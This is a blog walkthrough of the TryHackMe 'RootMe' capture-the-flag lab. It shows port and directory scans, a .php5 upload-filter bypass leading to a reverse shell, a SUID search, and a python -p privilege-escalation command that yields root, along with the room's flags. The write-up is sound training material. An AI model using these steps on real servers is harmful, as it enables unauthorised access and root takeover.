---
title: RootMe   
author: CYB3RM3
name: CYB3RM3 | RootMe
date: 2022-02-28 11:30:39 +0100
categories: [TryHackMe, CTF]
tags: [CTF, Web]
---

A ctf for beginners, can you root me?

THM Room [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)


## TASK 1 : Deploy the machine 
### Deploy the machine 
No Answer

## TASK 2 : Reconnaissance 
### Scan the machine, how many ports are open? 

```console
root@ip-10-10-247-193:~# nmap -vv -sC 10.10.76.243

Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-27 10:23 GMT
NSE: Loaded 118 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.00s elapsed
Initiating ARP Ping Scan at 10:23
Scanning 10.10.76.243 [1 port]
Completed ARP Ping Scan at 10:23, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:23
Completed Parallel DNS resolution of 1 host. at 10:23, 0.00s elapsed
Initiating SYN Stealth Scan at 10:23
Scanning ip-10-10-76-243.eu-west-1.compute.internal (10.10.76.243) [1000 ports]
Discovered open port 80/tcp on 10.10.76.243
Discovered open port 22/tcp on 10.10.76.243
Completed SYN Stealth Scan at 10:23, 1.26s elapsed (1000 total ports)
NSE: Script scanning 10.10.76.243.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.22s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.00s elapsed
Nmap scan report for ip-10-10-76-243.eu-west-1.compute.internal (10.10.76.243)
Host is up, received arp-response (0.0013s latency).
Scanned at 2022-02-27 10:23:11 GMT for 2s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9irIQxn1jiKNjwLFTFBitstKOcP7gYt7HQsk6kyRQJjlkhHYuIaLTtt1adsWWUhAlMGl+97TsNK93DijTFrjzz4iv1Zwpt2hhSPQG0GibavCBf5GVPb6TitSskqpgGmFAcvyEFv6fLBS7jUzbG50PDgXHPNIn2WUoa2tLPSr23Di3QO9miVT3+TqdvMiphYaz0RUAD/QMLdXipATI5DydoXhtymG7Nb11sVmgZ00DPK+XJ7WB++ndNdzLW9525v4wzkr1vsfUo9rTMo6D6ZeUF8MngQQx5u4pA230IIXMXoRMaWoUgCB6GENFUhzNrUfryL02/EMt5pgfj8G7ojx5
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBERAcu0+Tsp5KwMXdhMWEbPcF5JrZzhDTVERXqFstm7WA/5+6JiNmLNSPrqTuMb2ZpJvtL9MPhhCEDu6KZ7q6rI=
|   256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC4fnU3h1O9PseKBbB/6m5x8Bo3cwSPmnfmcWQAVN93J
80/tcp open  http    syn-ack ttl 64
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: HackIT - Home
MAC Address: 02:F2:1A:FF:F4:BB (Unknown)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:23
Completed NSE at 10:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
           Raw packets sent: 1002 (44.072KB) | Rcvd: 1002 (40.076KB)
```
{: .nolineno }

Answer : 2

### What version of Apache is running?

```console
root@ip-10-10-247-193:~# nmap -sV --script http-apache-server-status 10.10.76.243

Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-27 10:24 GMT
Nmap scan report for ip-10-10-76-243.eu-west-1.compute.internal (10.10.76.243)
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 02:F2:1A:FF:F4:BB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```
{: .nolineno }

Answer : 2.4.29

### What service is running on port 22?
Answer : ssh

### Find directories on the web server using the GoBuster tool.

```console
root@ip-10-10-247-193:~# gobuster dir -u http://10.10.76.243 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.76.243
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Timeout:        10s
===============================================================
2022/02/27 10:27:29 Starting gobuster
===============================================================
/index.php (Status: 200)
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
===============================================================
2022/02/27 10:29:17 Finished
===============================================================
```
{: .nolineno }

No Answer.

### What is the hidden directory?

Checked out the directories found by gobuster, /panel/ gives me a webpage uploader :

![Directory panel](/images/thm/rrootme/rrootme_1.png)
_Directory panel_

And /uploads seems to be the directory where uploads goes :

![Upload Directory](/images/thm/rrootme/rrootme_2.png)
_Upload Directory_

Answer : /panel/

## TASK 3 : Getting a shell
### Find a form to upload and get a reverse shell, and find the flag.
As I noted, /panel is a form to uploads on the server and the uploads are stored in the /uploads directory which is accessible. So I tried to uploads some files with different extensions and they were uploaded :

![Uploads](/images/thm/rrootme/rrootme_3.png)
_Uploads_

But PHP file are not permitted :

![Upload denied](/images/thm/rrootme/rrootme_4.png)
_Upload denied_

I then tried PHP filter evasion with .png extension and upload a PHP echo print. This doesn't work.

I tried to uploads a .php5 file for echo('helo') and it works :

![PHP filter evasion](/images/thm/rrootme/rrootme_5.png)
_PHP filter evasion_

One more step needed to get a shell, uploads a .php5 file which can allows me to get a reverse shell. After few simples attempts, I choose a php reverse shell i already worked with, from pentestmonkey <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>:

![Rerverse shell access](/images/thm/rrootme/rrootme_6.png)
_Rerverse shell access_

II change the IP and the Port to be mine an i got a shell.

After looking some directories (/home/rootme, /etc, /var/www) i found the user.txt file in /var/www directory. 

```console
$ cd /var/www
$ ls
html
user.txt
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```
{: .nolineno }

Answer : THM{y0u_g0t_a_sh3ll}

## TASK 4 : Privilege escalation 
### Search for files with SUID permission, which file is weird? 
Looking for SUIDs permissions :

```console
find / -user root -perm -4000 -print 2>/dev/null
```
{: .nolineno }

![Find SUID](/images/thm/rrootme/rrootme_7.png)
_Find SUID_

Python seems good to check on GFTOBINS :

![SUID](/images/thm/rrootme/rrootme_8.png)
_SUID_

Answer : /usr/bin/python

### Find a form to escalate your privileges.

Executed the gftobins command :

```console
$ cd /usr/bin
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
{: .nolineno }

No Answer.

### root.txt

```console
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
{: .nolineno }

Answer : THM{pr1v1l3g3_3sc4l4t10n}